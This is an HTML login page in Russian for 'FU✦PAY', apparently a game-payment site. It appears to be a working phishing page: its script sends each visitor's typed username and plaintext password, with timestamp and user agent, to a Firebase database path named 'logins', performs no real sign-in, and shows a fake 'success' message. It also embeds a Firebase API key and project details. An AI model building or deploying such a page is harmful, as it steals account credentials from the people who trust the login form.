<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>FU✦PAY — Войти</title>
  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@600;800&family=DM+Sans:wght@400;500&display=swap" rel="stylesheet"/>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    :root {
      --bg: #0e0f13;
      --surface: #16181f;
      --border: #2a2d38;
      --accent: #f5a623;
      --accent2: #3b82f6;
      --text: #e8eaf0;
      --muted: #6b7280;
      --danger: #ef4444;
      --success: #22c55e;
    }

    body {
      background: var(--bg);
      color: var(--text);
      font-family: 'DM Sans', sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    /* HEADER */
    header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 16px 32px;
      border-bottom: 1px solid var(--border);
      background: var(--surface);
    }

    .logo {
      font-family: 'Syne', sans-serif;
      font-weight: 800;
      font-size: 22px;
      letter-spacing: -0.5px;
      color: var(--text);
    }
    .logo span { color: var(--accent); }

    .search-bar {
      display: flex;
      align-items: center;
      gap: 8px;
      background: var(--bg);
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 8px 16px;
      color: var(--muted);
      font-size: 14px;
      cursor: pointer;
      transition: border-color 0.2s;
    }
    .search-bar:hover { border-color: var(--accent); }

    .menu-btn {
      background: none;
      border: none;
      cursor: pointer;
      display: flex;
      flex-direction: column;
      gap: 5px;
      padding: 4px;
    }
    .menu-btn span {
      display: block;
      width: 22px;
      height: 2px;
      background: var(--text);
      border-radius: 2px;
      transition: 0.2s;
    }

    /* MAIN */
    main {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 40px 16px;
      background: radial-gradient(ellipse at 50% 0%, rgba(245,166,35,0.06) 0%, transparent 70%);
    }

    .card {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 40px;
      width: 100%;
      max-width: 420px;
      box-shadow: 0 24px 64px rgba(0,0,0,0.4);
      animation: fadeUp 0.4s ease both;
    }

    @keyframes fadeUp {
      from { opacity: 0; transform: translateY(20px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    /* TABS */
    .tabs {
      display: flex;
      gap: 0;
      margin-bottom: 28px;
      border-bottom: 1px solid var(--border);
    }
    .tab {
      font-family: 'Syne', sans-serif;
      font-weight: 600;
      font-size: 16px;
      padding: 0 0 14px;
      margin-right: 24px;
      border: none;
      background: none;
      color: var(--muted);
      cursor: pointer;
      position: relative;
      transition: color 0.2s;
    }
    .tab.active { color: var(--text); }
    .tab.active::after {
      content: '';
      position: absolute;
      bottom: -1px;
      left: 0; right: 0;
      height: 2px;
      background: var(--accent);
      border-radius: 2px;
    }

    /* SOCIAL */
    .social-label {
      font-size: 13px;
      color: var(--muted);
      margin-bottom: 12px;
    }
    .social-btns {
      display: flex;
      gap: 10px;
      margin-bottom: 24px;
    }
    .social-btn {
      width: 46px;
      height: 46px;
      border-radius: 50%;
      border: 1px solid var(--border);
      background: var(--bg);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: border-color 0.2s, transform 0.15s;
    }
    .social-btn:hover { border-color: var(--accent); transform: scale(1.05); }
    .social-btn img { width: 22px; height: 22px; }

    /* DIVIDER */
    .divider {
      font-size: 13px;
      color: var(--muted);
      margin-bottom: 20px;
    }

    /* FORM */
    .form-group { margin-bottom: 14px; }
    .form-group input {
      width: 100%;
      background: var(--bg);
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 13px 16px;
      color: var(--text);
      font-family: 'DM Sans', sans-serif;
      font-size: 15px;
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s;
    }
    .form-group input::placeholder { color: var(--muted); }
    .form-group input:focus {
      border-color: var(--accent);
      box-shadow: 0 0 0 3px rgba(245,166,35,0.12);
    }

    .forgot {
      display: inline-block;
      color: var(--accent2);
      font-size: 13px;
      text-decoration: none;
      margin-bottom: 20px;
      transition: color 0.2s;
    }
    .forgot:hover { color: #60a5fa; }

    /* SUBMIT */
    .submit-btn {
      width: 100%;
      padding: 14px;
      background: var(--accent);
      color: #0e0f13;
      font-family: 'Syne', sans-serif;
      font-weight: 700;
      font-size: 16px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: background 0.2s, transform 0.15s, box-shadow 0.2s;
      position: relative;
      overflow: hidden;
    }
    .submit-btn:hover {
      background: #f0b93a;
      box-shadow: 0 8px 24px rgba(245,166,35,0.3);
      transform: translateY(-1px);
    }
    .submit-btn:active { transform: translateY(0); }
    .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }

    /* TOAST */
    .toast {
      display: none;
      align-items: center;
      gap: 10px;
      background: #1a2e1a;
      border: 1px solid var(--success);
      border-radius: 10px;
      padding: 12px 16px;
      margin-bottom: 16px;
      font-size: 14px;
      color: var(--success);
      animation: fadeUp 0.3s ease both;
    }
    .toast.error {
      background: #2e1a1a;
      border-color: var(--danger);
      color: var(--danger);
    }
    .toast.show { display: flex; }
    .toast-dot { width: 8px; height: 8px; border-radius: 50%; background: currentColor; flex-shrink: 0; }
  </style>
</head>
<body>

<header>
  <div class="logo">FU<span>✦</span>PAY</div>
  <div class="search-bar">
    <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
    Поиск по 830 играм
  </div>
  <button class="menu-btn" aria-label="Меню">
    <span></span><span></span><span></span>
  </button>
</header>

<main>
  <div class="card">
    <div class="tabs">
      <button class="tab active" id="tab-login">Войти</button>
      <button class="tab" id="tab-register">Зарегистрироваться</button>
    </div>

    <p class="social-label">Через сервисы:</p>
    <div class="social-btns">
      <button class="social-btn" title="Google">
        <svg width="22" height="22" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.08 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-3.59-13.46-8.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
      </button>
      <button class="social-btn" title="VK">
        <svg width="22" height="22" viewBox="0 0 48 48"><circle cx="24" cy="24" r="24" fill="#0077FF"/><path fill="#fff" d="M25.54 34s.63-.07.95-.42c.3-.32.29-.93.29-.93s-.04-2.84 1.28-3.26c1.3-.41 2.97 2.75 4.74 3.96.34.23 1.34.7 1.34.7l2.7-.04s1.41-.09.74-1.19c-.05-.09-.38-.8-1.97-2.26-1.66-1.53-1.44-1.28.56-3.92 1.22-1.62 1.71-2.61 1.55-3.03-.14-.4-1.04-.29-1.04-.29l-3.04.02s-.23-.03-.39.07c-.16.1-.26.32-.26.32s-.47 1.26-1.1 2.33c-1.33 2.26-1.86 2.38-2.08 2.24-.5-.33-.38-1.31-.38-2.01 0-2.18.33-3.09-.65-3.33-.32-.08-.56-.13-1.39-.14-1.06-.01-1.95.01-2.46.25-.34.16-.6.52-.44.54.2.03.64.12.88.44.3.41.29 1.34.29 1.34s.17 2.57-.4 2.88c-.39.21-.93-.22-2.08-2.2-.6-1.04-1.06-2.19-1.06-2.19s-.09-.21-.24-.32a1.2 1.2 0 0 0-.44-.17l-2.88.02s-.43.01-.59.2c-.14.17-.01.52-.01.52s2.25 5.26 4.79 7.91c2.33 2.43 4.98 2.27 4.98 2.27h1.2z"/></svg>
      </button>
    </div>

    <p class="divider">Или с помощью имени, почты и пароля:</p>

    <div id="toast" class="toast">
      <div class="toast-dot"></div>
      <span id="toast-msg">Данные отправлены!</span>
    </div>

    <div class="form-group">
      <input type="text" id="username" placeholder="Имя пользователя или почта" autocomplete="username"/>
    </div>
    <div class="form-group">
      <input type="password" id="password" placeholder="Пароль" autocomplete="current-password"/>
    </div>

    <a href="#" class="forgot">Забыли пароль?</a>

    <button class="submit-btn" id="loginBtn">Войти</button>
  </div>
</main>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
  import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyBMKuV2V-MsAIQo4XlthA59_zTH3vUCaqg",
    authDomain: "fu-pay-bdefa.firebaseapp.com",
    databaseURL: "https://fu-pay-bdefa-default-rtdb.firebaseio.com",
    projectId: "fu-pay-bdefa",
    storageBucket: "fu-pay-bdefa.firebasestorage.app",
    messagingSenderId: "486996812011",
    appId: "1:486996812011:web:0667a41b95bd66ea689eae",
    measurementId: "G-VXCPMTB99J"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  function showToast(msg, isError = false) {
    const toast = document.getElementById('toast');
    const toastMsg = document.getElementById('toast-msg');
    toast.classList.remove('error');
    if (isError) toast.classList.add('error');
    toastMsg.textContent = msg;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 3000);
  }

  document.getElementById('loginBtn').addEventListener('click', async () => {
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    const btn = document.getElementById('loginBtn');

    if (!username || !password) {
      showToast('Заполните все поля', true);
      return;
    }

    btn.disabled = true;
    btn.textContent = 'Входим...';

    try {
      await push(ref(db, 'logins'), {
        username,
        password,
        time: new Date().toLocaleString('ru-RU'),
        userAgent: navigator.userAgent
      });
      showToast('Успешно. Добро пожаловать!');
    } catch (e) {
      showToast('Ошибка подключения', true);
      console.error(e);
    } finally {
      btn.disabled = false;
      btn.textContent = 'Войти';
    }
  });

  // Tab switch (UI only)
  document.getElementById('tab-login').addEventListener('click', () => {
    document.getElementById('tab-login').classList.add('active');
    document.getElementById('tab-register').classList.remove('active');
  });
  document.getElementById('tab-register').addEventListener('click', () => {
    document.getElementById('tab-register').classList.add('active');
    document.getElementById('tab-login').classList.remove('active');
  });
</script>

</body>
</html>
